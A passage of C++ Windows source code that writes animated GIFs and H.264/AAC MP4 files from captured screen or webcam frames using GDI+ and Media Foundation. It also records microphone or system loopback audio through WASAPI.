// (PropertyTagFrameDelay is an integer tag, not a GUID), so define it here.
static const GUID kGifFrameDelayGuid =
    { 0x6aedbd6d, 0x3fb5, 0x418a, { 0x83, 0xa6, 0x7f, 0x45, 0x22, 0x9d, 0xc8, 0x72 } };

// Write an animated GIF from a set of captured frames using GDI+.
static bool writeAnimatedGif(const std::string& outPath,
    const std::vector<std::vector<BYTE>>& frames, int w, int h, int frameDelayCs) {
    if (frames.empty() || w <= 0 || h <= 0) return false;

    Gdiplus::GdiplusStartupInput gdiIn;
    ULONG_PTR token = 0;
    if (Gdiplus::GdiplusStartup(&token, &gdiIn, nullptr) != Gdiplus::Ok)
        return false;

    bool ok = false;
    {
        auto makeBitmap = [&](const std::vector<BYTE>& px) -> Gdiplus::Bitmap* {
            if ((int)px.size() < w * h * 4) return nullptr;
            Gdiplus::Bitmap* bmp = new Gdiplus::Bitmap(w, h, PixelFormat32bppARGB);
            if (!bmp) return nullptr;
            Gdiplus::Rect rect(0, 0, w, h);
            Gdiplus::BitmapData bd;
            if (bmp->LockBits(&rect, Gdiplus::ImageLockModeWrite, PixelFormat32bppARGB, &bd) != Gdiplus::Ok) {
                delete bmp;
                return nullptr;
            }
            // Copy row by row honouring the destination stride.
            for (int y = 0; y < h; ++y) {
                const BYTE* src = px.data() + (size_t)y * w * 4;
                BYTE* dst = (BYTE*)bd.Scan0 + (size_t)y * bd.Stride;
                memcpy(dst, src, (size_t)w * 4);
            }
            bmp->UnlockBits(&bd);
            return bmp;
        };

        Gdiplus::Bitmap* base = makeBitmap(frames[0]);
        if (base) {
            CLSID gifClsid;
            if (getEncoderClsid(L"image/gif", &gifClsid) >= 0) {
                // Convert the std::string path to the wide string GDI+ requires.
                std::wstring wpath(outPath.begin(), outPath.end());

                ULONG delayValue = (ULONG)frameDelayCs;

                // Save the first frame as an animated (multi-frame) GIF.
                {
                    Gdiplus::EncoderParameters ep;
                    ep.Count = 2;
                    ep.Parameter[0].Guid = Gdiplus::EncoderSaveFlag;
                    ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                    ULONG flag = Gdiplus::EncoderValueMultiFrame;
                    ep.Parameter[0].Value = &flag;
                    ep.Parameter[1].Guid = kGifFrameDelayGuid;
                    ep.Parameter[1].Type = Gdiplus::EncoderParameterValueTypeLong;
                    ULONG delayArr[1] = { delayValue };
                    ep.Parameter[1].NumberOfValues = 1;
                    ep.Parameter[1].Value = delayArr;
                    base->Save(wpath.c_str(), &gifClsid, &ep);
                }

                // Append the remaining frames.
                for (size_t i = 1; i < frames.size(); ++i) {
                    Gdiplus::Bitmap* add = makeBitmap(frames[i]);
                    if (!add) continue;
                    Gdiplus::EncoderParameters ep;
                    ep.Count = 2;
                    ep.Parameter[0].Guid = Gdiplus::EncoderSaveFlag;
                    ep.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
                    ULONG flag = Gdiplus::EncoderValueFrameDimensionTime;
                    ep.Parameter[0].Value = &flag;
                    ep.Parameter[1].Guid = kGifFrameDelayGuid;
                    ep.Parameter[1].Type = Gdiplus::EncoderParameterValueTypeLong;
                    ULONG delayArr[1] = { delayValue };
                    ep.Parameter[1].NumberOfValues = 1;
                    ep.Parameter[1].Value = delayArr;
                    base->SaveAdd(add, &ep);
                    delete add;
                }
                base->SaveAdd(nullptr, nullptr);
                ok = (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES);
            }
            delete base;
        }
    }
    Gdiplus::GdiplusShutdown(token);
    return ok;
}

// === Native MP4 writer (Media Foundation H.264 [+ AAC]) ===
//
// Emits a real .mp4 with no external ffmpeg: frames arrive as top-down 32-bit
// BGRX (exactly what grabDesktopPixels / the VFW webcam sink produce), get
// converted to NV12 and fed to the Windows H.264 MFT. Audio, when present, is
// 16-bit PCM and is encoded to AAC. Both streams are muxed into MPEG-4.

// Lazily start Media Foundation exactly once per process.
static bool ensureMfStarted() {
    static int state = 0; // 0 = not tried, 1 = ok, -1 = failed
    if (state == 0) {
        HRESULT hr = MFStartup(MF_VERSION, MFSTARTUP_LITE);
        state = SUCCEEDED(hr) ? 1 : -1;
        if (state == -1) traceStage("mf: MFStartup FAILED");
    }
    return state == 1;
}

// Convert one top-down 32bpp BGRX frame into an NV12 (or I420 as fallback) buffer.
// Returns the byte count written to `dst`.
static DWORD bgraToNv12(const BYTE* src, int w, int h, int srcStride, std::vector<BYTE>& dst) {
    const int cw = w / 2;
    const int ch = h / 2;
    dst.assign((size_t)w * h + (size_t)w * ch, 128);
    BYTE* yPlane = dst.data();
    BYTE* uvPlane = dst.data() + (size_t)w * h;

    // Luma
    for (int y = 0; y < h; ++y) {
        const BYTE* srow = src + (size_t)y * srcStride;
        BYTE* drow = yPlane + (size_t)y * w;
        for (int x = 0; x < w; ++x) {
            const BYTE b = srow[x * 4 + 0];
            const BYTE g = srow[x * 4 + 1];
            const BYTE r = srow[x * 4 + 2];
            // BT.601 studio-swing luma, integer approximation.
            int yv = ((66 * r + 129 * g + 25 * b + 128) >> 8) + 16;
            drow[x] = (BYTE)(yv < 0 ? 0 : (yv > 255 ? 255 : yv));
        }
    }

    // Chroma: interleaved U/V, averaged over each 2x2 block.
    for (int y = 0; y < ch; ++y) {
        BYTE* drow = uvPlane + (size_t)y * w;
        for (int x = 0; x < cw; ++x) {
            int su = 0, sv = 0;
            for (int dy = 0; dy < 2; ++dy) {
                const BYTE* srow = src + (size_t)(y * 2 + dy) * srcStride;
                for (int dx = 0; dx < 2; ++dx) {
                    const BYTE b = srow[(x * 2 + dx) * 4 + 0];
                    const BYTE g = srow[(x * 2 + dx) * 4 + 1];
                    const BYTE r = srow[(x * 2 + dx) * 4 + 2];
                    su += ((-38 * r - 74 * g + 112 * b + 128) >> 8) + 128;
                    sv += ((112 * r - 94 * g - 18 * b + 128) >> 8) + 128;
                }
            }
            su /= 4; sv /= 4;
            drow[x * 2 + 0] = (BYTE)(su < 0 ? 0 : (su > 255 ? 255 : su));
            drow[x * 2 + 1] = (BYTE)(sv < 0 ? 0 : (sv > 255 ? 255 : sv));
        }
    }
    return (DWORD)dst.size();
}

// Mux a silent AAC track of `ms` milliseconds. Used when no audio device is
// available so the delivered file always has an audio stream.
static void writeSilentAacTrack(IMFSinkWriter* writer, DWORD audioStream, DWORD sampleRate,
    WORD channels, DWORD ms) {
    if (!writer || audioStream == (DWORD)-1 || ms == 0) return;
    const DWORD blockAlign = channels * 2;
    DWORD frames = (DWORD)((long long)sampleRate * ms / 1000);
    const DWORD chunkMs = 100;
    DWORD chunkFrames = (DWORD)((long long)sampleRate * chunkMs / 1000);
    if (chunkFrames < 1) chunkFrames = 1;

    std::vector<BYTE> silence((size_t)chunkFrames * blockAlign, 0);
    LONGLONG base = 0;
    while (frames > 0) {
        DWORD n = frames > chunkFrames ? chunkFrames : frames;
        DWORD bytes = n * blockAlign;
        if (bytes > silence.size()) bytes = (DWORD)silence.size();

        IMFMediaBuffer* buf = nullptr;
        if (FAILED(MFCreateMemoryBuffer(bytes, &buf)) || !buf) break;
        BYTE* dst = nullptr;
        if (FAILED(buf->Lock(&dst, nullptr, nullptr)) || !dst) { buf->Release(); break; }
        memcpy(dst, silence.data(), bytes);
        buf->Unlock();
        buf->SetCurrentLength(bytes);

        IMFSample* sample = nullptr;
        if (SUCCEEDED(MFCreateSample(&sample)) && sample) {
            sample->AddBuffer(buf);
            LONGLONG dur = (LONGLONG)n * 10000000LL / (LONGLONG)sampleRate;
            sample->SetSampleTime(base);
            sample->SetSampleDuration(dur);
            writer->WriteSample(audioStream, sample);
            base += dur;
            sample->Release();
        }
        buf->Release();
        frames -= n;
    }
}

// Core MP4 muxer. `frames` are top-down 32bpp BGRX buffers of size w*h*4.
// `pcm` (optional) is interleaved 16-bit signed PCM at `pcmRate`/`pcmChannels`.
static bool writeMp4(const std::string& outPath,
    const std::vector<std::vector<BYTE>>& frames, int w, int h, int fps,
    const std::vector<char>& pcm, DWORD pcmRate, WORD pcmChannels) {
    if (frames.empty() || w <= 0 || h <= 0) return false;
    if (!ensureMfStarted()) return false;

    // H.264 needs even dimensions.
    int ew = w & ~1;
    int eh = h & ~1;
    if (ew < 2 || eh < 2) return false;

    std::wstring wpath(outPath.begin(), outPath.end());

    IMFAttributes* attrs = nullptr;
    if (FAILED(MFCreateAttributes(&attrs, 3)) || !attrs) return false;
    // Fast, low-latency encode — plenty for screen/webcam content.
    attrs->SetUINT32(MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, TRUE);
    attrs->SetUINT32(MF_SINK_WRITER_DISABLE_THROTTLING, TRUE);

    IMFSinkWriter* writer = nullptr;
    HRESULT hr = MFCreateSinkWriterFromURL(wpath.c_str(), nullptr, attrs, &writer);
    attrs->Release();
    if (FAILED(hr) || !writer) {
        traceStage("mf: MFCreateSinkWriterFromURL FAILED");
        return false;
    }

    DWORD videoStream = (DWORD)-1;
    {
        IMFMediaType* outType = nullptr;
        MFCreateMediaType(&outType);
        outType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        outType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_H264);
        outType->SetUINT32(MF_MT_AVG_BITRATE, (UINT32)(w * h * fps / 6 + 800000));
        outType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
        MFSetAttributeSize(outType, MF_MT_FRAME_SIZE, ew, eh);
        MFSetAttributeRatio(outType, MF_MT_FRAME_RATE, fps, 1);
        MFSetAttributeRatio(outType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
        outType->SetUINT32(MF_MT_MPEG2_PROFILE, eAVEncH264VProfile_Main);
        hr = writer->AddStream(outType, &videoStream);
        outType->Release();
        if (FAILED(hr)) {
            traceStage("mf: AddStream(video) FAILED");
            writer->Release();
            return false;
        }

        IMFMediaType* inType = nullptr;
        MFCreateMediaType(&inType);
        inType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Video);
        inType->SetGUID(MF_MT_SUBTYPE, MFVideoFormat_NV12);
        inType->SetUINT32(MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive);
        MFSetAttributeSize(inType, MF_MT_FRAME_SIZE, ew, eh);
        MFSetAttributeRatio(inType, MF_MT_FRAME_RATE, fps, 1);
        MFSetAttributeRatio(inType, MF_MT_PIXEL_ASPECT_RATIO, 1, 1);
        hr = writer->SetInputMediaType(videoStream, inType, nullptr);
        inType->Release();
        if (FAILED(hr)) {
            traceStage("mf: SetInputMediaType(video=NV12) FAILED");
            writer->Release();
            return false;
        }
    }

    // ---- optional audio stream ----
    DWORD audioStream = (DWORD)-1;
    bool haveAudio = !pcm.empty() && pcmRate > 0 && pcmChannels > 0;
    if (haveAudio) {
        IMFMediaType* outType = nullptr;
        MFCreateMediaType(&outType);
        outType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
        outType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_AAC);
        outType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, pcmRate);
        outType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, pcmChannels);
        outType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
        outType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, 16000); // 128 kbps AAC
        outType->SetUINT32(MF_MT_AAC_PAYLOAD_TYPE, 0);
        hr = writer->AddStream(outType, &audioStream);
        outType->Release();
        if (FAILED(hr)) {
            audioStream = (DWORD)-1;
            haveAudio = false;
            traceStage("mf: AddStream(audio) FAILED, video only");
        } else {
            IMFMediaType* inType = nullptr;
            MFCreateMediaType(&inType);
            inType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
            inType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_PCM);
            inType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
            inType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, pcmRate);
            inType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, pcmChannels);
            inType->SetUINT32(MF_MT_AUDIO_BLOCK_ALIGNMENT, pcmChannels * 2);
            inType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, pcmRate * pcmChannels * 2);
            inType->SetUINT32(MF_MT_ALL_SAMPLES_INDEPENDENT, TRUE);
            hr = writer->SetInputMediaType(audioStream, inType, nullptr);
            inType->Release();
            if (FAILED(hr)) {
                audioStream = (DWORD)-1;
                haveAudio = false;
                traceStage("mf: SetInputMediaType(audio=PCM) FAILED, video only");
            }
        }
    }

    if (FAILED(writer->BeginWriting())) {
        traceStage("mf: BeginWriting FAILED");
        writer->Release();
        return false;
    }

    // ---- video samples ----
    const LONGLONG frameDur = 10000000LL / fps;
    std::vector<BYTE> nv12;
    DWORD nv12Bytes = bgraToNv12((const BYTE*)frames[0].data(), ew, eh, ew * 4, nv12);

    LONGLONG t = 0;
    for (size_t i = 0; i < frames.size(); ++i) {
        const std::vector<BYTE>& f = frames[i];
        if ((int)f.size() < ew * eh * 4) { t += frameDur; continue; }
        nv12Bytes = bgraToNv12((const BYTE*)f.data(), ew, eh, ew * 4, nv12);

        IMFMediaBuffer* buf = nullptr;
        if (FAILED(MFCreateMemoryBuffer(nv12Bytes, &buf)) || !buf) break;
        BYTE* dst = nullptr;
        if (FAILED(buf->Lock(&dst, nullptr, nullptr)) || !dst) { buf->Release(); break; }
        memcpy(dst, nv12.data(), nv12Bytes);
        buf->Unlock();
        buf->SetCurrentLength(nv12Bytes);

        IMFSample* sample = nullptr;
        if (SUCCEEDED(MFCreateSample(&sample)) && sample) {
            sample->AddBuffer(buf);
            sample->SetSampleTime(t);
            sample->SetSampleDuration(frameDur);
            writer->WriteSample(videoStream, sample);
            sample->Release();
        }
        buf->Release();
        t += frameDur;
    }

    // ---- audio samples ----
    if (haveAudio) {
        const DWORD blockAlign = pcmChannels * 2;
        // Feed in 100 ms chunks; take the exact same wall-clock span as the video.
        const size_t spanBytes = (size_t)((long long)pcmRate * blockAlign * (frames.size() * 1000LL / fps) / 1000);
        size_t usable = pcm.size() < spanBytes ? pcm.size() : spanBytes;
        usable -= usable % blockAlign;
        DWORD chunkFrames = (DWORD)((long long)pcmRate * 100 / 1000);
        if (chunkFrames < 1) chunkFrames = 1;
        const size_t chunkBytes = (size_t)chunkFrames * blockAlign;

        LONGLONG at = 0;
        size_t off = 0;
        while (off < usable) {
            size_t nBytes = usable - off;
            if (nBytes > chunkBytes) nBytes = chunkBytes;

            IMFMediaBuffer* buf = nullptr;
            if (FAILED(MFCreateMemoryBuffer((DWORD)nBytes, &buf)) || !buf) break;
            BYTE* dst = nullptr;
            if (FAILED(buf->Lock(&dst, nullptr, nullptr)) || !dst) { buf->Release(); break; }
            memcpy(dst, pcm.data() + off, nBytes);
            buf->Unlock();
            buf->SetCurrentLength((DWORD)nBytes);

            IMFSample* sample = nullptr;
            if (SUCCEEDED(MFCreateSample(&sample)) && sample) {
                sample->AddBuffer(buf);
                DWORD nFrames = (DWORD)(nBytes / blockAlign);
                LONGLONG dur = (LONGLONG)nFrames * 10000000LL / (LONGLONG)pcmRate;
                sample->SetSampleTime(at);
                sample->SetSampleDuration(dur);
                writer->WriteSample(audioStream, sample);
                at += dur;
                sample->Release();
            }
            buf->Release();
            off += nBytes;
        }

        // Pad the track so the audio stream covers the whole video duration.
        LONGLONG videoEnd = (LONGLONG)frames.size() * frameDur;
        if (at < videoEnd) {
            DWORD remainingMs = (DWORD)((videoEnd - at) / 10000);
            // Emit silence using the same chunked path.
            const DWORD blockAlign2 = pcmChannels * 2;
            std::vector<BYTE> silence((size_t)chunkFrames * blockAlign2, 0);
            while (remainingMs > 0) {
                DWORD n = remainingMs > 100 ? 100 : remainingMs;
                DWORD bytes = (DWORD)((long long)pcmRate * n / 1000) * blockAlign2;
                if (bytes == 0) break;
                if (bytes > silence.size()) bytes = (DWORD)silence.size();

                IMFMediaBuffer* buf = nullptr;
                if (FAILED(MFCreateMemoryBuffer(bytes, &buf)) || !buf) break;
                BYTE* dst = nullptr;
                if (FAILED(buf->Lock(&dst, nullptr, nullptr)) || !dst) { buf->Release(); break; }
                memcpy(dst, silence.data(), bytes);
                buf->Unlock();
                buf->SetCurrentLength(bytes);

                IMFSample* sample = nullptr;
                if (SUCCEEDED(MFCreateSample(&sample)) && sample) {
                    sample->AddBuffer(buf);
                    DWORD nFrames = bytes / blockAlign2;
                    LONGLONG dur = (LONGLONG)nFrames * 10000000LL / (LONGLONG)pcmRate;
                    sample->SetSampleTime(at);
                    sample->SetSampleDuration(dur);
                    writer->WriteSample(audioStream, sample);
                    at += dur;
                    sample->Release();
                }
                buf->Release();
                remainingMs -= n;
            }
        }
    } else if (audioStream == (DWORD)-1) {
        // No real audio: still emit an AAC stream so every MP4 plays with audio.
        IMFMediaType* outType = nullptr;
        MFCreateMediaType(&outType);
        outType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
        outType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_AAC);
        outType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, 44100);
        outType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, 2);
        outType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
        outType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, 16000);
        outType->SetUINT32(MF_MT_AAC_PAYLOAD_TYPE, 0);
        if (SUCCEEDED(writer->AddStream(outType, &audioStream))) {
            IMFMediaType* inType = nullptr;
            MFCreateMediaType(&inType);
            inType->SetGUID(MF_MT_MAJOR_TYPE, MFMediaType_Audio);
            inType->SetGUID(MF_MT_SUBTYPE, MFAudioFormat_PCM);
            inType->SetUINT32(MF_MT_AUDIO_BITS_PER_SAMPLE, 16);
            inType->SetUINT32(MF_MT_AUDIO_SAMPLES_PER_SECOND, 44100);
            inType->SetUINT32(MF_MT_AUDIO_NUM_CHANNELS, 2);
            inType->SetUINT32(MF_MT_AUDIO_BLOCK_ALIGNMENT, 4);
            inType->SetUINT32(MF_MT_AUDIO_AVG_BYTES_PER_SECOND, 44100 * 4);
            inType->SetUINT32(MF_MT_ALL_SAMPLES_INDEPENDENT, TRUE);
            if (SUCCEEDED(writer->SetInputMediaType(audioStream, inType, nullptr))) {
                writeSilentAacTrack(writer, audioStream, 44100, 2,
                    (DWORD)(frames.size() * 1000LL / fps));
            } else {
                audioStream = (DWORD)-1;
            }
            inType->Release();
        }
        outType->Release();
    }

    writer->Finalize();
    writer->Release();

    bool ok = (GetFileAttributesA(outPath.c_str()) != INVALID_FILE_ATTRIBUTES);
    if (!ok) traceStage("mf: finalize produced no file");
    return ok;
}

// === Screen-recording audio (microphone + system loopback) ===
//
// Both sources are captured via WASAPI in the *same* time window as the video,
// then mixed into a single 16-bit stereo PCM stream that goes into the MP4.
// Capturing both under one thread keeps them synchronised with the frames.

// Lean WASAPI declarations so we don't have to pull in the whole mmdeviceapi header set.
struct WasapiIfc {
    HMODULE hOle = nullptr;
    HMODULE hMmdev = nullptr;
    HRESULT (WINAPI* CoInitializeEx)(LPVOID, DWORD) = nullptr;
    void    (WINAPI* CoUninitialize)() = nullptr;
    HRESULT (WINAPI* CoCreateInstance)(const CLSID&, LPUNKNOWN, DWORD, const IID&, LPVOID*) = nullptr;

    HMODULE hUser32 = nullptr;
    DWORD   (WINAPI* GetProcessIdOfThread)(HANDLE) = nullptr;
    DWORD   (WINAPI* GetWindowThreadProcessId)(HWND, LPDWORD) = nullptr;
    HWND    (WINAPI* GetForegroundWindow)() = nullptr;
    HWND    (WINAPI* GetShellWindow)() = nullptr;

    bool ok() const { return CoInitializeEx && CoCreateInstance && CoUninitialize; }
};

static WasapiIfc& wasapi() {
    static WasapiIfc ifc;
    static bool init = false;
    if (!init) {
        init = true;
        ifc.hOle = LoadLibraryA("ole32.dll");
        ifc.hMmdev = LoadLibraryA("mmdevapi.dll");
        if (ifc.hOle) {
            ifc.CoInitializeEx = (HRESULT(WINAPI*)(LPVOID, DWORD))GetProcAddress(ifc.hOle, "CoInitializeEx");
            ifc.CoUninitialize = (void(WINAPI*)())GetProcAddress(ifc.hOle, "CoUninitialize");
            ifc.CoCreateInstance = (HRESULT(WINAPI*)(const CLSID&, LPUNKNOWN, DWORD, const IID&, LPVOID*))
                GetProcAddress(ifc.hOle, "CoCreateInstance");
        }
    }
    return ifc;
}

// Record one WASAPI endpoint (render loopback or capture) for `durationSec`.
// Output is 16-bit signed PCM, `sampleRate` Hz, `channels` channels.
// `wantName` (optional): when non-empty, scan all capture devices for one whose
// friendly name contains this substring (used to find "Stereo Mix" / "What U Hear").
static bool wasapiRecordEndpoint(bool loopback, int durationSec,
    std::vector<char>& outPcm, DWORD& sampleRate, WORD& channels,
    const std::string& wantName) {
    if (durationSec < 1) durationSec = 1;
    if (durationSec > 600) durationSec = 600;

    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coOwned = SUCCEEDED(hr) || hr == RPC_E_CHANGED_MODE;

    IMMDeviceEnumerator* enumerator = nullptr;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_ALL,
        __uuidof(IMMDeviceEnumerator), (void**)&enumerator);
    if (FAILED(hr) || !enumerator) {
        { char tb[96]; snprintf(tb, sizeof(tb), "wasapi[%s]: CoCreateInstance hr=0x%08lX",
            loopback ? "sys" : "mic", (unsigned long)hr); traceStage(tb); }
        if (coOwned) CoUninitialize();
        return false;
    }

    IMMDevice* device = nullptr;
    if (!wantName.empty()) {
        // Enumerate capture endpoints and pick one whose friendly name matches.
        IMMDeviceCollection* coll = nullptr;
        if (SUCCEEDED(enumerator->EnumAudioEndpoints(eCapture, DEVICE_STATE_ACTIVE, &coll)) && coll) {
            UINT count = 0;
            coll->GetCount(&count);
            for (UINT i = 0; i < count && !device; ++i) {
                IMMDevice* cand = nullptr;
                if (FAILED(coll->Item(i, &cand)) || !cand) continue;

                IPropertyStore* props = nullptr;
                std::string name;
                if (SUCCEEDED(cand->OpenPropertyStore(STGM_READ, &props)) && props) {
                    PROPVARIANT pv;
                    PropVariantInit(&pv);
                    if (SUCCEEDED(props->GetValue(PKEY_Device_FriendlyName, &pv)) &&
                        pv.vt == VT_LPWSTR && pv.pwszVal) {
                        // Narrow the wide friendly name for a substring match.
                        std::wstring ws(pv.pwszVal);
                        name.assign(ws.begin(), ws.end());
                    }
                    PropVariantClear(&pv);
                    props->Release();
                }

                std::string lower = name, needle = wantName;
                for (char& c : lower) c = (char)tolower((unsigned char)c);
                for (char& c : needle) c = (char)tolower((unsigned char)c);
                if (!name.empty() && lower.find(needle) != std::string::npos) {
                    device = cand;
                    { char tb[192]; snprintf(tb, sizeof(tb), "wasapi: matched '%s' for '%s'",
                        name.c_str(), wantName.c_str()); traceStage(tb); }
                } else {
                    cand->Release();
                }
            }
            coll->Release();
        }
    }

    if (!device)
        hr = enumerator->GetDefaultAudioEndpoint(loopback ? eRender : eCapture, eConsole, &device);
    else
        hr = S_OK;
    enumerator->Release();
    if (FAILED(hr) || !device) {
        { char tb[96]; snprintf(tb, sizeof(tb), "wasapi[%s]: GetDefaultAudioEndpoint hr=0x%08lX",
            loopback ? "sys" : "mic", (unsigned long)hr); traceStage(tb); }
        if (coOwned) CoUninitialize();
        return false;
    }

    IAudioClient* client = nullptr;
    hr = device->Activate(__uuidof(IAudioClient), CLSCTX_ALL, nullptr, (void**)&client);
    device->Release();
    if (FAILED(hr) || !client) {
        { char tb[96]; snprintf(tb, sizeof(tb), "wasapi[%s]: Activate hr=0x%08lX",
            loopback ? "sys" : "mic", (unsigned long)hr); traceStage(tb); }
        if (coOwned) CoUninitialize();
        return false;
    }

    WAVEFORMATEX* mix = nullptr;
    hr = client->GetMixFormat(&mix);
    if (FAILED(hr) || !mix) {
        client->Release();
        if (coOwned) CoUninitialize();
        return false;
    }

    {
        char tb[160];
        snprintf(tb, sizeof(tb), "wasapi[%s]: mixfmt ch=%d rate=%d bits=%d tag=%d",
            loopback ? "sys" : "mic", mix->nChannels, (int)mix->nSamplesPerSec,
            mix->wBitsPerSample, mix->wFormatTag);
        traceStage(tb);
    }

    // Loopback quirk: an event-driven loopback stream frequently never fires
    // because the render engine idles when no application is playing. Polling
    // is the reliable mode for a loopback capture, so only use event callbacks
    // for real capture endpoints (microphone).
    DWORD flags = 0;
    if (!loopback) flags |= AUDCLNT_STREAMFLAGS_EVENTCALLBACK;
    if (loopback) flags |= AUDCLNT_STREAMFLAGS_LOOPBACK;
    flags |= AUDCLNT_STREAMFLAGS_NOPERSIST;

    // Loopback benefits from a smaller buffer — a full-second buffer delays the
    // first packet and can make a short recording come back empty.
    const REFERENCE_TIME bufDur = loopback ? 2000000 : 5000000; // 200 ms / 500 ms
    hr = client->Initialize(AUDCLNT_SHAREMODE_SHARED, flags, bufDur, 0, mix, nullptr);
    {
        char tb[192];
        snprintf(tb, sizeof(tb), "wasapi[%s]: Initialize(flags=0x%lX mode=%s buf=%lldms) hr=0x%08lX",
            loopback ? "sys" : "mic", (unsigned long)flags,
            (flags & AUDCLNT_STREAMFLAGS_EVENTCALLBACK) ? "event" : "poll",
            (long long)(bufDur / 10000), (unsigned long)hr);
        traceStage(tb);
    }
    if (FAILED(hr)) {
        // Some drivers reject the flag combination — retry with the minimal set.
        flags &= ~(AUDCLNT_STREAMFLAGS_EVENTCALLBACK | AUDCLNT_STREAMFLAGS_NOPERSIST);
        hr = client->Initialize(AUDCLNT_SHAREMODE_SHARED, flags, bufDur, 0, mix, nullptr);
        {
            char tb[192];
            snprintf(tb, sizeof(tb), "wasapi[%s]: Initialize(retry flags=0x%lX) hr=0x%08lX",
                loopback ? "sys" : "mic", (unsigned long)flags, (unsigned long)hr);
            traceStage(tb);
        }
    }
    if (FAILED(hr)) {
        CoTaskMemFree(mix);
        client->Release();
        if (coOwned) CoUninitialize();
        return false;
    }

    UINT32 bufFrames = 0;
    client->GetBufferSize(&bufFrames);

    IAudioCaptureClient* capture = nullptr;
    hr = client->GetService(__uuidof(IAudioCaptureClient), (void**)&capture);
    if (FAILED(hr) || !capture) {
        CoTaskMemFree(mix);
        client->Release();
        if (coOwned) CoUninitialize();
        return false;
    }

    HANDLE evt = nullptr;
    if (flags & AUDCLNT_STREAMFLAGS_EVENTCALLBACK) {
        evt = CreateEventA(nullptr, FALSE, FALSE, nullptr);
        if (evt) client->SetEventHandle(evt);
    }

    if (FAILED(client->Start())) {
        if (evt) CloseHandle(evt);
        capture->Release();
        CoTaskMemFree(mix);
        client->Release();
        if (coOwned) CoUninitialize();
        return false;
    }

    // Target output format: 16-bit signed, stereo, 44100 Hz.
    const DWORD outRate = 44100;
    const WORD outCh = 2;
    const WORD inBits = mix->wBitsPerSample;
    const WORD inCh = mix->nChannels;
    const DWORD inRate = mix->nSamplesPerSec;
    const bool inFloat = (mix->wFormatTag == WAVE_FORMAT_IEEE_FLOAT) ||
        (mix->wFormatTag == WAVE_FORMAT_EXTENSIBLE && inBits == 32);

    // Simple nearest-neighbour resample is not needed if rates match (usual case).
    const bool sameRate = (inRate == outRate);

    DWORD startTick = GetTickCount();
    DWORD durationMs = (DWORD)durationSec * 1000;
    std::vector<char> pcm;
    UINT32 totalPackets = 0;
    UINT32 totalInFrames = 0;
    int silentPackets = 0;

    while (GetTickCount() - startTick < durationMs) {
        if (evt) {
            WaitForSingleObject(evt, 100);
        } else {
            // Poll finely: loopback only yields a packet when the render engine
            // ticks, and a coarse sleep can miss short bursts entirely.
            Sleep(loopback ? 5 : 20);
        }

        UINT32 packet = 0;
        while (SUCCEEDED(capture->GetNextPacketSize(&packet)) && packet > 0) {
            BYTE* data = nullptr;
            UINT32 frames = 0;
            DWORD st = 0;
            hr = capture->GetBuffer(&data, &frames, &st, nullptr, nullptr);
            if (FAILED(hr)) break;

            if (frames > 0 && data) {
                totalPackets++;
                totalInFrames += frames;
                if (st & AUDCLNT_BUFFERFLAGS_SILENT) silentPackets++;
                const size_t outSamples = (size_t)frames * outCh;
                const size_t base = pcm.size();
                pcm.resize(base + outSamples * 2);
                short* dst = (short*)(pcm.data() + base);

                const bool silent = (st & AUDCLNT_BUFFERFLAGS_SILENT) != 0;
                for (UINT32 i = 0; i < frames; ++i) {
                    float l = 0.0f, r = 0.0f;
                    if (!silent) {
                        if (inFloat) {
                            const float* fs = (const float*)(data + (size_t)i * inCh * 4);
                            l = fs[0];
                            r = (inCh > 1) ? fs[1] : fs[0];
                        } else if (inBits == 16) {
                            const short* ss = (const short*)(data + (size_t)i * inCh * 2);
                            l = ss[0] / 32768.0f;
                            r = (inCh > 1) ? ss[1] / 32768.0f : l;
                        } else if (inBits == 32) {
                            const int* ss = (const int*)(data + (size_t)i * inCh * 4);
                            l = (float)(ss[0] / 2147483648.0);
                            r = (inCh > 1) ? (float)(ss[1] / 2147483648.0) : l;
                        } else if (inBits == 8) {
                            const BYTE* ss = data + (size_t)i * inCh;
                            l = (ss[0] - 128) / 128.0f;
                            r = (inCh > 1) ? (ss[1] - 128) / 128.0f : l;
                        }
                    }
                    if (l > 1.0f) l = 1.0f; if (l < -1.0f) l = -1.0f;
                    if (r > 1.0f) r = 1.0f; if (r < -1.0f) r = -1.0f;
                    dst[i * 2 + 0] = (short)(l * 32767.0f);
                    dst[i * 2 + 1] = (short)(r * 32767.0f);
                }
            }
            capture->ReleaseBuffer(frames);
        }
    }

    client->Stop();
    if (evt) CloseHandle(evt);
    capture->Release();
    CoTaskMemFree(mix);
    client->Release();
    if (coOwned) CoUninitialize();

    {
        char tb[160];
        snprintf(tb, sizeof(tb), "wasapi[%s]: packets=%u inFrames=%u silent=%d pcm=%zu bytes",
